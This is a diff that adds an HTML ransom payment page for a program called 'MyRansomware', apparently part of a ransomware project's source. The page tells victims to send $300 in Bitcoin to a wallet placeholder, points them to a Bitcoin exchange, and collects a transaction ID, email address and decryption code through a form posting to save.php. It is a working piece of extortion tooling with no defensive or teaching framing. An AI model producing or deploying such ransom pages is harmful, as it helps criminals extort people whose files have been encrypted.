@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>MyRansomware Decryption</title>
+</head>
+<body>
+<h1>MyRansomware decryption page</h1>
+<b>How to get the key</b><ol>
+    <li>Send 300$ Bitcoin to this address [Wallet Address]. (You can buy Bitcoin <a href="https://localbitcoins.com/">here</a>)</li>
+    <li>Enter transaction ID, your email address and your decryption code in this form and click submit. You will get an email with the key to decrypt after 12 - 48 hours.</li></ol>
+<form method="post" action="save.php">
+    <label>
+        <input name="tid" placeholder="Enter transaction ID" type="text" style="width: 400px;" />
+    </label><br>
+    <label>
+        <input name="ema" placeholder="Enter your email address" type="text" style="width: 400px;" />
+    </label><br>
+    <label>
+        <input name="dec" placeholder="Enter your decryption code" type="text" style="width: 400px;" />
+    </label><br>
+    <input type="submit" name="submit"/>
+</form>
+</body>
+<style>
+    body {
+        padding: 20px;
+        background: #000000;
+        font-family: Calibri, serif;
+        color: #ffffff;}
+</style>
+</html>
